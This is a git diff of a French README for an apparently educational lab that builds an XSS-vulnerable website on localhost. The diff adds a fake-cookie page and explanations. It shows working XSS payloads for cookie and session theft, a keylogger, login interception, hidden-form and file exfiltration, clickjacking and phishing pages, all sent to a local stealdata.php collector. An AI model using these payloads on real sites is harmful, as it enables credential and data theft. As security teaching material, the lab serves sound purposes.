@@ -1,6 +1,6 @@
 # Démo2
 
-- Ce projet est un exemple complet et détaillé qui montre comment créer un site web vulnérable à des fins éducatives, en utilisant de vrais cookies.
+- Ce projet est un exemple complet et détaillé qui montre comment créer un site web vulnérable à des fins éducatives, en utilisant de vrais cookies. 
 - Assurez-vous de configurer et d'exécuter ce projet dans un environnement sécurisé, comme une machine virtuelle isolée sous Kali Linux.
 
 ## Arborescence du système de fichiers
@@ -14,7 +14,8 @@
 ├── malicious.js
 ├── offer.html
 ├── fake.html
-└── chat.php
+├── chat.php
+└── set_cookies.html
 ```
 
 ## Prérequis
@@ -45,6 +46,68 @@
      ```
 
 ## Étape par étape
+
+### Étape 0 : Ajouter et voir des cookies fictifs
+
+Pour tester les fonctionnalités XSS avec des cookies, nous devons d'abord ajouter des cookies fictifs et vérifier qu'ils sont bien présents.
+
+#### 1. Création du fichier `set_cookies.html`
+
+Créez un fichier nommé `set_cookies.html` avec le contenu suivant :
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Set and View Fake Cookies</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+</head>
+<body>
+    <div class="container mt-5">
+        <h1>Set and View Fake Cookies</h1>
+        <button id="setCookies" class="btn btn-primary">Set Fake Cookies</button>
+        <button id="viewCookies" class="btn btn-secondary">View Cookies</button>
+        <div id="cookieStatus" class="mt-3"></div>
+        <div id="cookieList" class="mt-3"></div>
+    </div>
+    <script>
+        document.getElementById('setCookies').addEventListener('click', function() {
+            for (let i = 0; i < 10; i++) {
+                document.cookie = `fakeCookie${i}=value${i}; path=/;`;
+            }
+            document.getElementById('cookieStatus').innerText = 'Fake cookies have been set!';
+        });
+
+        document.getElementById('viewCookies').addEventListener('click', function() {
+            const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
+            const cookieListDiv = document.getElementById('cookieList');
+            cookieListDiv.innerHTML = '<h3>Current Cookies:</h3><ul class="list-group">';
+            cookies.forEach(([name, value]) => {
+                cookieListDiv.innerHTML += `<li class="list-group-item">${name}: ${value}</li>`;
+            });
+            cookieListDiv.innerHTML += '</ul>';
+        });
+    </script>
+</body>
+</html>
+```
+
+**Explication :** Ce fichier crée une page web avec deux boutons. Le premier bouton ajoute des cookies fictifs lorsque vous cliquez dessus, et le second bouton affiche les cookies actuels du navigateur.
+
+**Ce que vous devriez voir :**
+- Après avoir cliqué sur "Set Fake Cookies", un message "Fake cookies have been set!" devrait s'afficher.
+- Après avoir cliqué sur "View Cookies", une liste des cookies ajoutés devrait s'afficher sous forme de liste.
+
+#### 2. Accéder à la page pour créer et voir les cookies
+
+- Ouvrez votre navigateur et accédez à `http://localhost/demo2/set_cookies.html`.
+- Cliquez sur le bouton "Set Fake Cookies" pour ajouter les cookies fictifs.
+- Cliquez sur le bouton "View Cookies" pour afficher les cookies actuellement définis dans le navigateur.
+
+#### 3. Vérifier les cookies
+
+Pour vérifier que les cookies ont été créés, ouvrez les outils de développement de votre navigateur (F12), allez dans l'onglet "Application" (ou "Storage" selon le navigateur), puis dans la section "Cookies". Vous devriez voir les cookies fictifs ajoutés.
 
 ### Étape 1 : Création de `index.html`
 
@@ -113,6 +176,12 @@ Créez un fichier `index.html` avec le contenu suivant :
 </html>
 ```
 
+**Explication :** Ce fichier crée une page web avec un formulaire pour soumettre des commentaires et un bouton pour annuler le dernier commentaire ajouté. Les commentaires sont chargés à partir de `comments.json`.
+
+**Ce que vous devriez voir :**
+- Une page avec un formulaire pour ajouter des commentaires.
+- Les commentaires existants chargés et affichés dans la section "Comment Section".
+
 ### Étape 2 : Création de `comment.php`
 
 Créez un fichier `comment.php` avec le contenu suivant :
@@ -136,6 +205,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['comment'])) {
 ?>
 ```
 
+**Explication :** Ce fichier reçoit les commentaires soumis via le formulaire et les enregistre dans `comments.json`.
+
+**Ce que vous devriez voir :**
+- Lorsque vous soumettez un commentaire via le formulaire, il est ajouté à `comments.json` et affiché sur la page.
+
 ### Étape 3 : Création de `save_comments.php`
 
 Créez un fichier `save_comments.php` avec le contenu suivant :
@@ -156,6 +230,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 ?>
 ```
 
+**Explication :** Ce fichier reçoit les données JSON pour les commentaires et les enregistre dans `comments.json`. Il est utilisé par le bouton "Annuler le dernier commentaire".
+
+**Ce que vous devriez voir :**
+- Lorsque vous
+
+ cliquez sur "Annuler le dernier commentaire", le dernier commentaire ajouté est supprimé et la page est rechargée.
+
 ### Étape 4 : Création de `comments.json`
 
 Créez un fichier `comments.json` avec le contenu suivant :
@@ -165,6 +246,11 @@ Créez un fichier `comments.json` avec le contenu suivant :
     "comments": []
 }
 ```
+
+**Explication :** Ce fichier stocke les commentaires sous forme de JSON.
+
+**Ce que vous devriez voir :**
+- Ce fichier sera modifié lorsque des commentaires sont ajoutés ou supprimés.
 
 ### Étape 5 : Création des autres fichiers nécessaires
 
@@ -181,6 +267,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['data'])) {
 ?>
 ```
 
+**Explication :** Ce fichier reçoit des données volées et les enregistre dans `stolen_data.txt`.
+
 #### `malicious.js`
 
 ```javascript
@@ -190,6 +278,8 @@ document.onkeypress = function(e) {
     xhr.send();
 };
 ```
+
+**Explication :** Ce fichier enregistre les frappes de clavier et les envoie à une URL spécifiée.
 
 #### `offer.html`
 
@@ -209,6 +299,8 @@ document.onkeypress = function(e) {
 </body>
 </html>
 ```
+
+**Explication :** Ce fichier crée une page web avec une fausse offre exclusive.
 
 #### `fake.html`
 
@@ -237,6 +329,8 @@ document.onkeypress = function(e) {
 </html>
 ```
 
+**Explication :** Ce fichier crée une page de connexion factice pour voler des informations d'identification.
+
 #### `chat.php`
 
 ```php
@@ -248,6 +342,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 ?>
 ```
 
+**Explication :** Ce fichier reçoit des messages de chat et les enregistre dans `chat_log.txt`.
+
 ### Étape 6 : Vérification de l'installation
 
 1. **Accéder au site :**
@@ -258,6 +354,10 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 
 3. **Annuler le dernier commentaire :**
    - Utilisez le bouton "Annuler le dernier commentaire" pour supprimer le dernier commentaire ajouté.
+
+**Ce que vous devriez voir :**
+- Les commentaires soumis sont affichés sur la page.
+- Le bouton "Annuler le dernier commentaire" supprime le dernier commentaire ajouté et recharge la page.
 
 ### Étape 7 : Scripts de démonstration
 
@@ -271,6 +371,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script redirige l'utilisateur vers la page `offer.html`.
+
 - **Affichage d'une alerte :**
 
 ```html
@@ -279,6 +381,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script affiche une alerte avec le message "XSS Test".
+
 - **Affichage du cookie :**
 
 ```html
@@ -286,6 +390,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
     alert(document.cookie);
 </script>
 ```
+
+**Explication :** Ce script affiche les cookies de l'utilisateur dans une alerte.
 
 #### Scripts intermédiaires
 
@@ -298,6 +404,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script envoie les cookies de l'utilisateur à l'URL spécifiée via une requête GET.
+
 - **Envoi des cookies par POST :**
 
 ```html
@@ -305,14 +413,15 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
     var xhr = new XMLHttpRequest();
     xhr.open('POST', 'http://localhost/demo2/stealdata.php', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.send('cookie=' + encodeURIComponent(document
-
-.cookie));
+    xhr.send('cookie=' + encodeURIComponent(document.cookie));
 </script>
 ```
 
+**Explication :** Ce script envoie les cookies de l'utilisateur à l'URL spécifiée via une requête POST.
+
 - **Création d'un formulaire caché pour vol de données :**
 
+```html
 ```html
 <form id="stealData" action="http://localhost/demo2/stealdata.php" method="post">
     <input type="hidden" name="data" value="Sensitive Data">
@@ -322,6 +431,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script crée et soumet un formulaire caché contenant des données sensibles.
+
 #### Scripts avancés
 
 - **Exécution d'un script externe :**
@@ -329,6 +440,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 ```html
 <script src="http://localhost/demo2/malicious.js"></script>
 ```
+
+**Explication :** Ce script inclut et exécute un fichier JavaScript externe.
 
 - **Keylogger simple :**
 
@@ -341,6 +454,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
     };
 </script>
 ```
+
+**Explication :** Ce script enregistre les frappes de clavier et les envoie à une URL spécifiée.
 
 - **Interception des formulaires de login :**
 
@@ -356,6 +471,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script intercepte la soumission d'un formulaire de connexion et envoie les données de connexion à une URL spécifiée.
+
 - **Vol des informations de la session :**
 
 ```html
@@ -366,6 +483,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script envoie les informations de session de l'utilisateur à une URL spécifiée.
+
 - **Affichage d'une fausse page de connexion :**
 
 ```html
@@ -374,6 +493,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script remplace le contenu de la page par un formulaire de connexion factice.
+
 - **Injection d'une balise script persistante (persistent XSS) :**
 
 ```html
@@ -381,6 +502,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
     document.write('<script src="http://localhost/demo2/malicious.js"><\/script>');
 </script>
 ```
+
+**Explication :** Ce script injecte une balise script persistante sur la page.
 
 #### Scripts très avancés
 
@@ -395,6 +518,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
     };
 </script>
 ```
+
+**Explication :** Ce script utilise les WebSockets pour envoyer des données en temps réel à une URL spécifiée.
 
 - **Exploitation de l'API FileReader pour voler des fichiers locaux (avec interaction utilisateur) :**
 
@@ -417,6 +542,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script crée un élément input de type fichier et utilise l'API FileReader pour lire et envoyer le contenu du fichier à une URL spécifiée.
+
 - **Déclenchement de fausses alertes de sécurité :**
 
 ```html
@@ -425,6 +552,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
     window.location.href = 'http://localhost/demo2/fix';
 </script>
 ```
+
+**Explication :** Ce script affiche une fausse alerte de sécurité et redirige l'utilisateur vers une URL spécifiée.
 
 - **Interception des clics utilisateur (clickjacking) :**
 
@@ -442,6 +571,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 <iframe id="clickjacker" src="http://localhost/demo2"></iframe>
 ```
 
+**Explication :** Ce script utilise une iframe transparente pour intercepter les clics de l'utilisateur et les rediriger vers une URL spécifiée.
+
 - **Déclenchement de fausses fenêtres de chat :**
 
 ```html
@@ -457,6 +588,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script affiche une fausse fenêtre de chat et envoie les messages saisis par l'utilisateur à une URL spécifiée.
+
 - **Injection de fausses pages de contenu (content spoofing) :**
 
 ```html
@@ -465,9 +598,16 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
 </script>
 ```
 
+**Explication :** Ce script remplace le contenu de la page par une fausse offre exclusive.
+
 ## Remarques importantes
 
 - **N'utilisez ces scripts que dans un environnement contrôlé et à des fins éducatives.**
 - **Assurez-vous d'obtenir les permissions nécessaires pour effectuer ces tests sur les systèmes concernés.**
 
-- La sécurité informatique est une responsabilité partagée, et l'apprentissage des vulnérabilités doit toujours s'accompagner d'un fort sens de l'éthique et du respect des lois en vigueur.
+La sécurité informatique est une responsabilité partagée, et l'apprentissage des vulnérabilités doit toujours s'accompagner d'un fort sens de l'éthique et du respect des lois en vigueur.
+
+---
+
+- En suivant ces étapes détaillées et en utilisant les fichiers fournis, les apprenants peuvent créer un site web vulnérable et comprendre les implications des failles XSS de manière pédagogique et sécurisée. 
+- Les fonctionnalités pour ajouter et visualiser des cookies fictifs permettent de tester les scripts dans un environnement contrôlé.
